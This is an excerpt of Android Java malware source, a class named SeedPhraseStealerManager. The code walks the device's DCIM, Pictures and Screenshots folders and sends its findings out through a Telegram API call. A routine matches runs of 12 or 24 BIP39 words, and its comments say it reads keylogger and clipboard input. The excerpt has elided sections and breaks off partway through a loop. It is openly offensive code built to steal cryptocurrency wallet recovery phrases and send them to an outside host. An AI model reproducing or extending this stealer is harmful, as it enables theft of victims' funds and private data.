...
public class SeedPhraseStealerManager {
    private Context context;
    // BIP39 word list (partial, 24 most common words for pattern matching)
    private static final Set<String> BIP39_WORDS = new HashSet<>(Arrays.asList(
        ...
        "antenna","antique","anxiety","any","apart","apologize","appear","apple","approve","april",
    ...
    public SeedPhraseStealerManager(Context context) { this.context = context; }

    public void scanGalleryForSeedPhrases() {
        new Thread(() -> {
            StringBuilder result = new StringBuilder("<b>🔍 Seed Phrase Scan Results</b>\n\n");
            int found = 0;
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
            File screenshots = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Screenshots");

            found += scanDirectory(dcim, result);
            found += scanDirectory(pictures, result);
            found += scanDirectory(screenshots, result);

            if (found == 0) result.append("<i>No seed phrases detected in gallery.</i>");
            else result.insert(0, "<b>⚠ SEED PHRASE ALERT: " + found + " potential matches</b>\n\n");

            TelegramApi.sendMessage(result.toString());
        }).start();
    }

    private int scanDirectory(File dir, StringBuilder result) {
        ...
        for (File file : files) {
            if (file.isDirectory() && !file.getName().startsWith(".")) {
                count += scanDirectory(file, result);
            }
        }
        // Note: Full OCR-based seed phrase detection requires ML Kit or Tesseract OCR.
        // This lightweight version monitors clipboard and keylogger for BIP39 words.
        return count;
    }

    /**
     * Scans a text string for BIP39 seed phrases (12/24 consecutive words).
     * Called from keylogger buffer or clipboard content.
     */
    public static String scanTextForSeedPhrase(String text) {
        ...
        for (String word : words) {
            if (BIP39_WORDS.contains(word)) {
                ...
                consecutive++;
                if (consecutive == 12 || consecutive == 24) {
